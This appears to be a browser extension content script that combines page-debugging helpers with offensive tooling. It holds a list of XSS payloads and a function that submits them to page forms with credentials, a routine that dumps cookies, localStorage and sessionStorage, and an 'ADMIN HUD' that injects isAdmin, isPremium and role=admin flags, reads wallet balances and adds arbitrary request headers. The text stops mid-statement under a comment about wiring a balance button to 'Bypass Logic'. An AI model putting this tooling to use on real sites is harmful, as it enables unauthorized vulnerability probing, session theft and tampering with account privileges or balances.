

(() => {
  if (window.__aiUIDoctorLoaded) return;
  window.__aiUIDoctorLoaded = true;

  const STATE = {
    selecting: false,
    hovered: null,
    selected: null,
    overlay: null,
    label: null,
    appliedStyleEl: null,
    appliedScriptCleanup: null,
    globalVarStyles: [],
    replacedScripts: [],
    consoleErrors: [],
  };

  const origError = console.error;
  console.error = function (...args) {
    try {
      STATE.consoleErrors.push(args.map(safeStringify).join(' '));
      if (STATE.consoleErrors.length > 30) STATE.consoleErrors.shift();
    } catch (_) {}
    return origError.apply(this, args);
  };
  window.addEventListener('error', (e) => {
    STATE.consoleErrors.push(`${e.message} @ ${e.filename}:${e.lineno}`);
    if (STATE.consoleErrors.length > 30) STATE.consoleErrors.shift();
  });
  window.addEventListener('unhandledrejection', (e) => {
    STATE.consoleErrors.push('UnhandledRejection: ' + safeStringify(e.reason));
    if (STATE.consoleErrors.length > 30) STATE.consoleErrors.shift();
  });

  // === Sovereign Suite — MAIN-world DOM hooks bridge ===
  // The dom_monitor_start tool installs a MutationObserver / WebSocket / fetch
  // override in the page MAIN world that posts events back via window.postMessage
  // (those scripts cannot call chrome.runtime directly). We forward them to
  // background.js so the popup terminal gets a live [HOOK] stream even when the
  // popup is closed (background keeps a 50-event ring buffer).
  window.addEventListener('message', (e) => {
    try {
      if (e.source !== window) return;
      const d = e.data;
      if (!d || typeof d !== 'object' || d.source !== 'aiud-dom-hook') return;
      chrome.runtime.sendMessage({
        type: 'DOM_HOOK_EVENT',
        event: {
          kind: String(d.kind || 'hook').slice(0, 32),
          selector: String(d.selector || '').slice(0, 200),
          before: String(d.before == null ? '' : d.before).slice(0, 200),
          after: String(d.after == null ? '' : d.after).slice(0, 200),
          note: String(d.note || '').slice(0, 240),
        },
      }).catch(() => {});
    } catch (_) {}
  });

  function safeStringify(v) {
    if (typeof v === 'string') return v;
    try { return JSON.stringify(v); } catch { return String(v); }
  }

  function ensureOverlay() {
    if (STATE.overlay) return;
    const o = document.createElement('div');
    o.style.cssText = `position:fixed;pointer-events:none;z-index:2147483646;
      border:2px solid #2563eb;background:rgba(37,99,235,0.12);
      transition:all 60ms ease-out;border-radius:2px;`;
    const lbl = document.createElement('div');
    lbl.style.cssText = `position:fixed;z-index:2147483647;pointer-events:none;
      background:#2563eb;color:#fff;padding:2px 6px;border-radius:3px;
      font:11px -apple-system,sans-serif;`;
    document.documentElement.appendChild(o);
    document.documentElement.appendChild(lbl);
    STATE.overlay = o; STATE.label = lbl;
  }
  function moveOverlay(el) {
    if (!el || !STATE.overlay) return;
    const r = el.getBoundingClientRect();
    Object.assign(STATE.overlay.style, {
      left: r.left + 'px', top: r.top + 'px',
      width: r.width + 'px', height: r.height + 'px',
    });
    Object.assign(STATE.label.style, {
      left: r.left + 'px',
      top: Math.max(0, r.top - 18) + 'px',
    });
    STATE.label.textContent = describe(el);
  }
  function hideOverlay() {
    STATE.overlay?.remove(); STATE.label?.remove();
    STATE.overlay = null; STATE.label = null;
  }
  function describe(el) {
    const id = el.id ? '#' + el.id : '';
    const cls = el.className && typeof el.className === 'string'
      ? '.' + el.className.trim().split(/\s+/).slice(0, 2).join('.') : '';
    return el.tagName.toLowerCase() + id + cls;
  }
  function uniqueSelector(el) {
    if (!(el instanceof Element)) return '';
    if (el.id) return '#' + CSS.escape(el.id);
    const parts = [];
    let node = el;
    while (node && node.nodeType === 1 && node !== document.body) {
      let part = node.tagName.toLowerCase();
      if (node.classList.length) {
        part += '.' + [...node.classList].slice(0, 2).map((c) => CSS.escape(c)).join('.');
      }
      const parent = node.parentNode;
      if (parent) {
        const same = [...parent.children].filter((c) => c.tagName === node.tagName);
        if (same.length > 1) part += `:nth-of-type(${same.indexOf(node) + 1})`;
      }
      parts.unshift(part);
      node = node.parentElement;
      if (parts.length > 6) break;
    }
    return parts.join(' > ');
  }
  function snapshotElement(el) {
    if (!el) return null;
    const rect = el.getBoundingClientRect();
    const cs = getComputedStyle(el);
    const keys = ['display','position','width','height','color','background-color',
      'font-size','font-family','font-weight','padding','margin','border','z-index',
      'overflow','flex','grid-template-columns'];
    const styles = {};
    keys.forEach((k) => (styles[k] = cs.getPropertyValue(k)));
    let codeText = null;
    if (el.tagName === 'SCRIPT' && !el.src) codeText = el.textContent;
    else if (el.tagName === 'PRE' || el.tagName === 'CODE') codeText = el.textContent;
    else if ((el.innerText || '').length > 200 && /[{};()=]/.test(el.innerText))
      codeText = el.innerText;
    return {
      tag: el.tagName.toLowerCase(),
      id: el.id || null,
      classes: [...el.classList],
      selector: uniqueSelector(el),
      text: (el.innerText || '').slice(0, 200),
      html: el.outerHTML.slice(0, 800),
      rect: { x: rect.x, y: rect.y, w: rect.width, h: rect.height },
      styles,
      codeText: codeText ? codeText.slice(0, 6000) : null,
    };
  }

  function rectsOverlap(a, b) {
    return !(a.right < b.left || a.left > b.right || a.bottom < b.top || a.top > b.bottom)
      && Math.abs(a.top - b.top) < 5 && Math.abs(a.left - b.left) < 5;
  }
  function parseRGB(s) {
    const m = (s || '').match(/rgba?\(([^)]+)\)/);
    if (!m) return null;
    const [r, g, b] = m[1].split(',').map((n) => parseFloat(n));
    return { r, g, b };
  }
  function effectiveBg(el) {
    let n = el;
    while (n && n.nodeType === 1) {
      const c = parseRGB(getComputedStyle(n).backgroundColor);
      if (c && (c.r || c.g || c.b)) return c;
      n = n.parentElement;
    }
    return { r: 255, g: 255, b: 255 };
  }
  function relLum({ r, g, b }) {
    const f = (v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); };
    return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b);
  }
  function contrastRatio(a, b) {
    const L1 = relLum(a), L2 = relLum(b);
    const [hi, lo] = L1 > L2 ? [L1, L2] : [L2, L1];
    return (hi + 0.05) / (lo + 0.05);
  }
  function scanIssues() {
    const issues = [];
    let broken = 0;
    document.querySelectorAll('img').forEach((img) => {
      if (img.complete && img.naturalWidth === 0 && broken < 5) {
        broken++;
        issues.push({ type: 'broken-image', selector: uniqueSelector(img), src: (img.src || '').slice(0, 200) });
      }
    });
    const all = document.querySelectorAll('body *');
    let overflowCount = 0, overlapCount = 0;
    const seen = [];
    for (const el of all) {
      if (overflowCount >= 5 && overlapCount >= 5) break;
      const cs = getComputedStyle(el);
      if (cs.display === 'none' || cs.visibility === 'hidden') continue;
      if (el.scrollWidth > el.clientWidth + 2 && cs.overflow !== 'auto'
        && cs.overflow !== 'scroll' && el.children.length === 0) {
        if (overflowCount++ < 5) {
          issues.push({ type: 'text-overflow', selector: uniqueSelector(el),
            text: (el.innerText || '').slice(0, 80) });
        }
      }
      if (el.children.length === 0 && el.innerText && el.innerText.trim()) {
        const r = el.getBoundingClientRect();
        if (r.width < 5 || r.height < 5) continue;
        for (const o of seen) {
          if (overlapCount >= 5) break;
          if (rectsOverlap(r, o.r)) {
            overlapCount++;
            if (overlapCount <= 5)
              issues.push({ type: 'overlap', selector: uniqueSelector(el), otherSelector: o.sel });
            break;
          }
        }
        if (seen.length < 200) seen.push({ r, sel: uniqueSelector(el) });
      }
    }
    let lowContrast = 0;
    const sample = document.querySelectorAll('p,span,a,h1,h2,h3,h4,button,label,li');
    for (let i = 0; i < sample.length && lowContrast < 5; i++) {
      const el = sample[i];
      const cs = getComputedStyle(el);
      const fg = parseRGB(cs.color), bg = effectiveBg(el);
      if (!fg || !bg) continue;
      const ratio = contrastRatio(fg, bg);
      if (ratio < 3) {
        lowContrast++;
        issues.push({ type: 'low-contrast', selector: uniqueSelector(el), ratio: +ratio.toFixed(2) });
      }
    }
    return { issues, consoleErrors: STATE.consoleErrors.slice(-10),
      url: location.href, title: document.title };
  }

  function getFullDomMinified(maxChars = 14000) {
    const clone = document.documentElement.cloneNode(true);
    clone.querySelectorAll('script').forEach((s) => {
      s.textContent = s.src ? '' : '/*<inline script ' + s.textContent.length + ' chars>*/';
    });
    clone.querySelectorAll('style').forEach((s) => {
      s.textContent = '/*<inline style ' + s.textContent.length + ' chars>*/';
    });
    clone.querySelectorAll('svg').forEach((s) => (s.innerHTML = ''));
    let html = clone.outerHTML.replace(/<!--[\s\S]*?-->/g, '')
      .replace(/\s+/g, ' ').replace(/>\s+</g, '><').trim();
    if (html.length > maxChars) html = html.slice(0, maxChars) + '...[truncated]';
    return html;
  }
  function getStructureSummary(maxLines = 250) {
    const lines = [];
    function walk(el, depth) {
      if (lines.length >= maxLines || !el || el.nodeType !== 1 || depth > 8) return;
      const id = el.id ? '#' + el.id : '';
      const cls = el.className && typeof el.className === 'string'
        ? '.' + el.className.trim().split(/\s+/).slice(0, 3).join('.') : '';
      lines.push('  '.repeat(depth) + el.tagName.toLowerCase() + id + cls);
      for (const c of el.children) walk(c, depth + 1);
    }
    walk(document.body, 0);
    return lines.join('\n');
  }
  function getKeyCSS(maxRules = 120) {
    const out = [];
    for (const sheet of document.styleSheets) {
      let rules;
      try { rules = sheet.cssRules; } catch { continue; }
      if (!rules) continue;
      for (const r of rules) {
        if (out.length >= maxRules) break;
        if (r.selectorText && r.style && r.style.cssText)
          out.push(r.selectorText + '{' + r.style.cssText.replace(/\s+/g, ' ') + '}');
      }
      if (out.length >= maxRules) break;
    }
    return out.join('\n');
  }
  function listScripts() {
    return [...document.querySelectorAll('script')].map((s, i) => ({
      index: i, src: s.src || null,
      inlineLength: s.src ? 0 : (s.textContent || '').length,
      preview: s.src ? null : (s.textContent || '').replace(/\s+/g, ' ').slice(0, 120),
    }));
  }
  function getScriptSource(matcher) {
    const scripts = [...document.querySelectorAll('script')];
    if (typeof matcher === 'number') {
      const s = scripts[matcher];
      return s ? { src: s.src || null, code: s.src ? null : s.textContent } : null;
    }
    const target = scripts.find((s) =>
      (s.src && s.src.includes(matcher)) ||
      (!s.src && (s.textContent || '').includes(matcher)));
    return target ? { src: target.src || null, code: target.src ? null : target.textContent } : null;
  }

  function applyCSS(css) {
    revertCSS();
    const style = document.createElement('style');
    style.setAttribute('data-ai-uid', 'patch');
    style.textContent = css;
    document.documentElement.appendChild(style);
    STATE.appliedStyleEl = style;
  }
  function revertCSS() {
    STATE.appliedStyleEl?.remove();
    STATE.appliedStyleEl = null;
  }
  function applyJS(js) {
    revertJS();
    const fn = new Function(js + '\n;return (typeof __smartCleanup === "function") ? __smartCleanup : null;');
    STATE.appliedScriptCleanup = fn();
  }
  function revertJS() {
    if (typeof STATE.appliedScriptCleanup === 'function') {
      try { STATE.appliedScriptCleanup(); } catch (_) {}
    }
    STATE.appliedScriptCleanup = null;
  }
  function applyGlobalVars(cssText) {
    const style = document.createElement('style');
    style.setAttribute('data-ai-uid', 'global-vars');
    style.textContent = cssText;
    document.documentElement.appendChild(style);
    STATE.globalVarStyles.push(style);
  }
  function revertGlobalVars() {
    STATE.globalVarStyles.forEach((s) => s.remove());
    STATE.globalVarStyles = [];
  }
  function replaceScript(matcher, newCode) {
    const scripts = [...document.querySelectorAll('script')];
    let target;
    if (typeof matcher === 'number') target = scripts[matcher];
    else target = scripts.find((s) =>
      (s.src && s.src.includes(matcher)) ||
      (!s.src && (s.textContent || '').includes(matcher)));
    if (!target) throw new Error('Script not found for matcher: ' + matcher);
    const replacement = document.createElement('script');
    replacement.setAttribute('data-ai-uid', 'replaced-script');
    replacement.textContent = newCode;
    const parent = target.parentNode;
    const nextSibling = target.nextSibling;
    parent.replaceChild(replacement, target);
    STATE.replacedScripts.push({ originalEl: target, replacementEl: replacement, parent, nextSibling });
  }
  function revertReplacedScripts() {
    while (STATE.replacedScripts.length) {
      const { originalEl, replacementEl, parent, nextSibling } = STATE.replacedScripts.pop();
      try { replacementEl.remove(); parent.insertBefore(originalEl, nextSibling); } catch (_) {}
    }
  }
  function revertAll() { revertCSS(); revertJS(); revertGlobalVars(); revertReplacedScripts(); }

  function extractHiddenState() {
    const hiddenInputs = [...document.querySelectorAll('input[type=hidden]')].map((i) => ({
      name: i.name || null, id: i.id || null,
      value: (i.value || '').slice(0, 500), form: i.form?.id || null,
    }));
    const meta = [...document.querySelectorAll('meta')]
      .filter((m) => m.name || m.getAttribute('property'))
      .map((m) => ({
        name: m.name || m.getAttribute('property'),
        content: (m.content || '').slice(0, 300),
      }));
    const dataAttrs = [];
    document.querySelectorAll('[data-state],[data-store],[data-config],[data-props]').forEach((el) => {
      for (const a of el.attributes) {
        if (a.name.startsWith('data-')) {
          dataAttrs.push({
            selector: uniqueSelector(el),
            attr: a.name, value: (a.value || '').slice(0, 400),
          });
        }
      }
    });
    let local = {}, session = {};
    try { for (const k of Object.keys(localStorage)) local[k] = (localStorage.getItem(k) || '').slice(0, 600); } catch {}
    try { for (const k of Object.keys(sessionStorage)) session[k] = (sessionStorage.getItem(k) || '').slice(0, 600); } catch {}
    const docCookies = (document.cookie || '').split(';').map((c) => c.trim()).filter(Boolean);
    const json = [...document.querySelectorAll('script[type="application/json"], script[type="application/ld+json"]')]
      .map((s, i) => ({
        index: i, id: s.id || null, type: s.type,
        snippet: (s.textContent || '').slice(0, 800),
        length: (s.textContent || '').length,
      }));
    return {
      url: location.href,
      hiddenInputs: hiddenInputs.slice(0, 50),
      meta: meta.slice(0, 30),
      dataAttrs: dataAttrs.slice(0, 30),
      localStorage: local,
      sessionStorage: session,
      cookies: docCookies.slice(0, 30),
      jsonScripts: json.slice(0, 8),
    };
  }

  function listForms() {
    return [...document.querySelectorAll('form')].map((f, i) => ({
      index: i,
      selector: uniqueSelector(f),
      action: f.action || location.href,
      method: (f.method || 'GET').toUpperCase(),
      enctype: f.enctype || 'application/x-www-form-urlencoded',
      fields: [...f.querySelectorAll('input, textarea, select')].map((inp) => ({
        name: inp.name || null,
        type: inp.type || inp.tagName.toLowerCase(),
        required: !!inp.required,
        valueLength: (inp.value || '').length,
      })).filter((x) => x.name),
    }));
  }

  function buildXssPayloads(marker) {
    return [
      `<script>__${marker}__</script>`,
      `"><img src=x onerror=__${marker}__>`,
      `'><svg onload=__${marker}__>`,
      `javascript:__${marker}__`,
      `"><iframe srcdoc='${marker}'>`,
      `${marker}<>"'`,
    ];
  }

  async function xssTestForm(formIndex) {
    const forms = [...document.querySelectorAll('form')];
    const form = forms[formIndex];
    if (!form) throw new Error('Form not found at index ' + formIndex);
    const action = form.action || location.href;
    const method = (form.method || 'GET').toUpperCase();
    const fields = [...form.querySelectorAll('input, textarea, select')]
      .filter((i) => i.name && !['submit','button','file','password'].includes(i.type));

    const findings = [];
    for (const field of fields) {
      const marker = 'XSSDOC' + Math.random().toString(36).slice(2, 8);
      const payloads = buildXssPayloads(marker);
      for (const payload of payloads) {
        const data = new URLSearchParams();
        for (const f of fields) data.append(f.name, f === field ? payload : (f.value || 'test'));
        try {
          const url = method === 'GET' ? action + (action.includes('?') ? '&' : '?') + data.toString() : action;
          const res = await fetch(url, {
            method,
            credentials: 'include',
            headers: method === 'GET' ? {} : { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: method === 'GET' ? undefined : data.toString(),
          });
          const text = await res.text();
          const reflectedRaw = text.includes(payload);
          const reflectedMarker = text.includes('__' + marker + '__') || text.includes(marker);
          const escaped = text.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
          if (reflectedRaw || (reflectedMarker && !escaped)) {
            findings.push({
              field: field.name,
              payload,
              status: res.status,
              reflectedRaw,
              reflectedMarker,
              escaped,
              snippet: extractAround(text, payload) || extractAround(text, marker),
            });
            if (findings.length >= 6) return findings;
          }
        } catch (err) {
          findings.push({ field: field.name, payload, error: err?.message || String(err) });
        }
      }
    }
    return findings;
  }

  function extractAround(text, needle) {
    const i = text.indexOf(needle);
    if (i < 0) return null;
    return text.slice(Math.max(0, i - 60), i + needle.length + 60);
  }

  function onMouseMove(e) {
    if (!STATE.selecting) return;
    const el = document.elementFromPoint(e.clientX, e.clientY);
    if (!el || el === STATE.hovered) return;
    STATE.hovered = el;
    moveOverlay(el);
  }
  function onClickSelect(e) {
    if (!STATE.selecting) return;
    e.preventDefault(); e.stopPropagation();
    const el = document.elementFromPoint(e.clientX, e.clientY);
    if (!el) return;
    STATE.selected = el;
    stopSelecting();
    moveOverlay(el);
    chrome.runtime.sendMessage({ type: 'ELEMENT_SELECTED', data: snapshotElement(el) });
  }
  function onKey(e) {
    if (e.key === 'Escape' && STATE.selecting) { stopSelecting(); hideOverlay(); }
  }
  function startSelecting() {
    STATE.selecting = true;
    ensureOverlay();
    document.addEventListener('mousemove', onMouseMove, true);
    document.addEventListener('click', onClickSelect, true);
    document.addEventListener('keydown', onKey, true);
  }
  function stopSelecting() {
    STATE.selecting = false;
    document.removeEventListener('mousemove', onMouseMove, true);
    document.removeEventListener('click', onClickSelect, true);
    document.removeEventListener('keydown', onKey, true);
  }

  chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
    (async () => {
      try {
        switch (msg.type) {
          case 'PING': sendResponse({ ok: true, pong: true }); break;
          case 'START_SELECT': startSelecting(); sendResponse({ ok: true }); break;
          case 'STOP_SELECT': stopSelecting(); hideOverlay(); sendResponse({ ok: true }); break;
          case 'GET_SELECTED': sendResponse({ ok: true, data: snapshotElement(STATE.selected) }); break;
          case 'SCAN': sendResponse({ ok: true, data: scanIssues() }); break;
          case 'GET_FULL_DOM':
            sendResponse({ ok: true, data: {
              dom: getFullDomMinified(),
              structure: getStructureSummary(),
              css: getKeyCSS(),
              url: location.href, title: document.title,
            } }); break;
          case 'LIST_SCRIPTS': sendResponse({ ok: true, data: listScripts() }); break;
          case 'GET_SCRIPT': sendResponse({ ok: true, data: getScriptSource(msg.matcher) }); break;
          case 'APPLY_CSS': applyCSS(msg.css); sendResponse({ ok: true }); break;
          case 'APPLY_JS': applyJS(msg.js); sendResponse({ ok: true }); break;
          case 'APPLY_GLOBAL_VARS': applyGlobalVars(msg.css); sendResponse({ ok: true }); break;
          case 'REPLACE_SCRIPT': replaceScript(msg.matcher, msg.code); sendResponse({ ok: true }); break;
          case 'REVERT': revertAll(); sendResponse({ ok: true }); break;

          case 'EXTRACT_HIDDEN_STATE': sendResponse({ ok: true, data: extractHiddenState() }); break;
          case 'LIST_FORMS': sendResponse({ ok: true, data: listForms() }); break;
          case 'XSS_TEST': {
            const findings = await xssTestForm(msg.formIndex);
            sendResponse({ ok: true, findings });
            break;
          }

          case 'ADMIN_OVERLAY_INJECT': injectAdminOverlay(msg.config); sendResponse({ ok: true }); break;
          case 'ADMIN_OVERLAY_REMOVE': removeAdminOverlay(); sendResponse({ ok: true }); break;
          case 'ADMIN_INJECT_FLAG': adminInjectFlag(msg.field, msg.value); sendResponse({ ok: true }); break;

          default: sendResponse({ ok: false, error: 'Unknown message: ' + msg.type });
        }
      } catch (err) {
        sendResponse({ ok: false, error: err?.message || String(err) });
      }
    })();
    return true;
  });

  // ═══════════════════════════════════════════════════════════
  // 👑 ADMIN OVERLAY — injected HUD on the active page
  // ═══════════════════════════════════════════════════════════

  const AO_ID = '__aiud_admin_overlay__';
  let aoNetLog = [];
  let aoNetObserver = null;

  function removeAdminOverlay() {
    const el = document.getElementById(AO_ID);
    if (el) el.remove();
    if (aoNetObserver) { try { aoNetObserver(); } catch (_) {} aoNetObserver = null; }
  }

  function adminInjectFlag(field, rawValue) {
    let value;
    try { value = JSON.parse(rawValue); } catch (_) { value = rawValue; }
    try { window[field] = value; } catch (_) {}
    ['__INITIAL_STATE__', '__PRELOADED_STATE__', '__NEXT_DATA__', '__NUXT__', '__APP_STATE__', '__STATE__'].forEach(k => {
      try { if (window[k] && typeof window[k] === 'object') window[k][field] = value; } catch (_) {}
    });
  }

  function injectAdminOverlay(cfg = {}) {
    removeAdminOverlay();

    const pos      = cfg.position || 'bottom';
    const theme    = cfg.theme    || 'dark';
    const opacity  = Math.min(100, Math.max(50, Number(cfg.opacity) || 95)) / 100;
    const mods     = cfg.modules  || {};

    const THEMES = {
      dark:   { bg: '#000000', border: '#b6ff00', accent: '#b6ff00', txt: '#e6e6e6', sub: '#9aa0a6', danger: '#ff3355', tag: '#161616' },
      purple: { bg: '#0a0015', border: '#a371f7', accent: '#c084fc', txt: '#e6e6e6', sub: '#9aa0a6', danger: '#ff3355', tag: '#1a0030' },
      red:    { bg: '#0d0000', border: '#ff3355', accent: '#ff6677', txt: '#ffe0e0', sub: '#cc9999', danger: '#ff3355', tag: '#200000' },
      green:  { bg: '#000d00', border: '#4eff8b', accent: '#00ff41', txt: '#ccffcc', sub: '#88bb88', danger: '#ff3355', tag: '#001400' },
    };
    const T = THEMES[theme] || THEMES.dark;

    // ── positional styles ──
    const POS_STYLES = {
      bottom:       'bottom:0;left:0;right:0;width:100%;flex-direction:row;border-top:2px solid ' + T.border,
      top:          'top:0;left:0;right:0;width:100%;flex-direction:row;border-bottom:2px solid ' + T.border,
      'bottom-right':'bottom:16px;right:16px;width:340px;flex-direction:column;border:2px solid ' + T.border + ';border-radius:8px;',
      'top-right':   'top:16px;right:16px;width:340px;flex-direction:column;border:2px solid ' + T.border + ';border-radius:8px;',
    };
    const isBar = pos === 'bottom' || pos === 'top';
    const posStyle = POS_STYLES[pos] || POS_STYLES.bottom;

    // ── build the HUD ──
    const hud = document.createElement('div');
    hud.id = AO_ID;
    hud.style.cssText = [
      'position:fixed;z-index:2147483647;',
      `background:${T.bg};`,
      `opacity:${opacity};`,
      'display:flex;align-items:stretch;',
      'font-family: ui-monospace,"JetBrains Mono",Menlo,Consolas,monospace;',
      'font-size:11px;line-height:1.4;',
      'pointer-events:auto;',
      posStyle,
    ].join('');

    // ── CSS helpers ──
    const tagStyle = `background:${T.tag};border:1px solid ${T.border};color:${T.accent};padding:1px 6px;border-radius:3px;margin:1px 2px;font-size:10px;font-weight:700;`;
    const btnStyle = `background:${T.tag};border:1px solid ${T.border};color:${T.accent};padding:2px 8px;border-radius:3px;cursor:pointer;font-family:inherit;font-size:11px;font-weight:700;white-space:nowrap;`;
    const sectionStyle = `padding:6px 10px;border-right:1px solid ${T.border}22;min-width:0;flex-shrink:0;`;

    // ── CLOSE button ──
    const closeBtn = document.createElement('button');
    closeBtn.textContent = '✕';
    closeBtn.title = 'Remove Admin Overlay';
    closeBtn.style.cssText = `position:absolute;top:3px;right:5px;background:none;border:none;color:${T.sub};cursor:pointer;font-size:12px;padding:0;`;
    closeBtn.addEventListener('click', () => removeAdminOverlay());
    hud.appendChild(closeBtn);

    // ── HEADER label ──
    const titleDiv = document.createElement('div');
    titleDiv.style.cssText = `${sectionStyle}display:flex;flex-direction:column;justify-content:center;`;
    titleDiv.innerHTML = `<span style="color:${T.accent};font-weight:900;letter-spacing:1px;font-size:12px;">👑 ADMIN HUD</span><span style="color:${T.sub};font-size:9px;">${location.hostname}</span>`;
    hud.appendChild(titleDiv);

    // ── SESSION module ──
    if (mods.session !== false) {
      const sec = document.createElement('div');
      sec.style.cssText = sectionStyle + 'display:flex;flex-direction:column;justify-content:center;max-width:200px;';
      const ls = Object.keys(localStorage).length;
      const ss = Object.keys(sessionStorage).length;
      const cookies = document.cookie.split(';').filter(c => c.trim()).length;
      const hasJwt  = document.cookie.includes('ey') || Object.values(localStorage).some(v => typeof v === 'string' && v.startsWith('ey'));
      sec.innerHTML = `
        <span style="color:${T.sub};font-size:9px;letter-spacing:0.5px;text-transform:uppercase;">SESSION</span>
        <span style="color:${T.txt};margin-top:1px;">
          <span style="${tagStyle}">🍪 ${cookies}</span>
          <span style="${tagStyle}">LS: ${ls}</span>
          <span style="${tagStyle}">SS: ${ss}</span>
          ${hasJwt ? `<span style="${tagStyle}color:#ffaa00;">JWT ✓</span>` : ''}
        </span>`;
      hud.appendChild(sec);
    }

    // ── BALANCE module ──
    if (mods.balance !== false) {
      const balSec = document.createElement('div');
      balSec.style.cssText = sectionStyle + 'display:flex;flex-direction:column;justify-content:center;';
      balSec.id = '__aiud_ao_balance__';

      function readBalance() {
        const SELECTORS = [
          '[class*="balance"]','[class*="wallet"]','[class*="credit"]','[class*="coin"]',
          '[id*="balance"]','[id*="wallet"]','[id*="credit"]','[data-testid*="balance"]',
          '[data-balance]','[data-wallet]',
        ];
        for (const sel of SELECTORS) {
          try {
            const el = document.querySelector(sel);
            if (el && el.textContent.trim()) return el.textContent.trim().slice(0, 40);
          } catch (_) {}
        }
        return '—';
      }

      function updateBalance() {
        const val = readBalance();
        balSec.innerHTML = `
          <span style="color:${T.sub};font-size:9px;letter-spacing:0.5px;text-transform:uppercase;">BALANCE</span>
          <span style="color:${T.accent};font-weight:900;font-size:13px;margin-top:2px;">${val}</span>`;
      }
      updateBalance();

      const balObs = new MutationObserver(updateBalance);
      balObs.observe(document.body, { childList: true, subtree: true, characterData: true });
      hud.appendChild(balSec);
    }

    // ── ADMIN FLAGS module ──
    if (mods.flags !== false) {
      const flagSec = document.createElement('div');
      flagSec.style.cssText = sectionStyle + 'display:flex;flex-direction:column;justify-content:center;gap:2px;';
      flagSec.innerHTML = `<span style="color:${T.sub};font-size:9px;letter-spacing:0.5px;text-transform:uppercase;margin-bottom:3px;">FLAGS</span>`;

      const FLAGS = [
        { label: 'isAdmin', field: 'isAdmin', value: true },
        { label: 'isPremium', field: 'isPremium', value: true },
        { label: 'role=admin', field: 'role', value: 'admin' },
      ];

      const flagRow = document.createElement('div');
      flagRow.style.cssText = 'display:flex;flex-wrap:wrap;gap:3px;';
      FLAGS.forEach(f => {
        const b = document.createElement('button');
        b.textContent = f.label;
        b.style.cssText = btnStyle;
        b.title = `Inject ${f.field} = ${JSON.stringify(f.value)} into window state`;
        b.addEventListener('click', () => {
          adminInjectFlag(f.field, JSON.stringify(f.value));
          b.style.color = T.accent;
          b.style.borderColor = T.accent;
          b.textContent = '✓ ' + f.label;
          setTimeout(() => { b.textContent = f.label; }, 2000);
        });
        flagRow.appendChild(b);
      });
      flagSec.appendChild(flagRow);
      hud.appendChild(flagSec);
    }

    // ── HEADER INJECTOR module ──
    if (mods.headers !== false) {
      const hdrSec = document.createElement('div');
      hdrSec.style.cssText = sectionStyle + 'display:flex;flex-direction:column;justify-content:center;gap:3px;';
      hdrSec.innerHTML = `<span style="color:${T.sub};font-size:9px;letter-spacing:0.5px;text-transform:uppercase;margin-bottom:2px;">HEADERS</span>`;

      const hdrRow = document.createElement('div');
      hdrRow.style.cssText = 'display:flex;gap:4px;align-items:center;';
      const hdrName  = document.createElement('input');
      const hdrValue = document.createElement('input');
      const hdrBtn   = document.createElement('button');
      const inputStyle = `background:#111;border:1px solid ${T.border}55;color:${T.txt};padding:2px 5px;border-radius:3px;font-family:inherit;font-size:10px;width:80px;`;
      hdrName.placeholder  = 'Header-Name';
      hdrValue.placeholder = 'value';
      hdrName.style.cssText  = inputStyle;
      hdrValue.style.cssText = inputStyle + 'width:90px;';
      hdrBtn.textContent = '+ Add';
      hdrBtn.style.cssText = btnStyle;
      hdrBtn.title = 'Send message to background to add a session-scoped header rule';
      hdrBtn.addEventListener('click', () => {
        const n = hdrName.value.trim();
        const v = hdrValue.value.trim();
        if (!n) return;
        chrome.runtime.sendMessage({
          type: 'ADD_HEADER_RULE',
          rule: { urlFilter: '*', requestHeaders: [{ name: n, op: 'set', value: v }], responseHeaders: [] },
        }).catch(() => {});
        hdrBtn.textContent = '✓';
        setTimeout(() => { hdrBtn.textContent = '+ Add'; }, 1500);
        hdrName.value = ''; hdrValue.value = '';
      });
      hdrRow.appendChild(hdrName);
      hdrRow.appendChild(hdrValue);
      hdrRow.appendChild(hdrBtn);
      hdrSec.appendChild(hdrRow);
      hud.appendChild(hdrSec);
    }

    // ── NETWORK LOG module ──
    if (mods.network) {
      const netSec = document.createElement('div');
      netSec.style.cssText = sectionStyle + 'display:flex;flex-direction:column;justify-content:center;min-width:120px;max-width:160px;';
      const netLabel = document.createElement('span');
      netLabel.style.cssText = `color:${T.sub};font-size:9px;letter-spacing:0.5px;text-transform:uppercase;`;
      netLabel.textContent = 'NETWORK';
      const netLog = document.createElement('div');
      netLog.style.cssText = `color:${T.txt};font-size:9px;max-height:40px;overflow:hidden;`;
      netSec.appendChild(netLabel);
      netSec.appendChild(netLog);
      hud.appendChild(netSec);

      aoNetLog = [];
      const origFetch = window.fetch;
      window.fetch = function(...args) {
        const url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '?';
        aoNetLog.unshift(url.split('/').slice(-2).join('/').slice(0, 30));
        if (aoNetLog.length > 4) aoNetLog.length = 4;
        netLog.innerHTML = aoNetLog.map(u => `<span style="color:${T.accent};">→</span> ${u}`).join('<br>');
        return origFetch.apply(this, args);
      };
      aoNetObserver = () => { window.fetch = origFetch; };
    }

    // ── DOM INSPECTOR module ──
    if (mods.dom) {
      const domSec = document.createElement('div');
      domSec.style.cssText = sectionStyle + 'display:flex;flex-direction:column;justify-content:center;';
      const domLabel = document.createElement('span');
      domLabel.style.cssText = `color:${T.sub};font-size:9px;letter-spacing:0.5px;text-transform:uppercase;`;
      domLabel.textContent = 'DOM HOVER';
      const domInfo = document.createElement('span');
      domInfo.id = '__aiud_dom_info__';
      domInfo.style.cssText = `color:${T.accent};font-size:9px;max-width:140px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;`;
      domInfo.textContent = 'hover any element';
      domSec.appendChild(domLabel);
      domSec.appendChild(domInfo);
      hud.appendChild(domSec);

      document.addEventListener('mouseover', function domHover(e) {
        if (!document.getElementById(AO_ID)) {
          document.removeEventListener('mouseover', domHover, true);
          return;
        }
        const el = e.target;
        if (el === hud || hud.contains(el)) return;
        const tag = el.tagName.toLowerCase();
        const id  = el.id ? '#' + el.id : '';
        const cls = el.className && typeof el.className === 'string' ? '.' + el.className.trim().split(/\s+/)[0] : '';
        domInfo.textContent = `${tag}${id}${cls}`;
      }, true);
    }

    document.documentElement.appendChild(hud);
  }
// Viralux Master Wiring: Connecting UI to Bypass Logic
document.getElementById('add-balance-btn').addEventListener('click', () => {
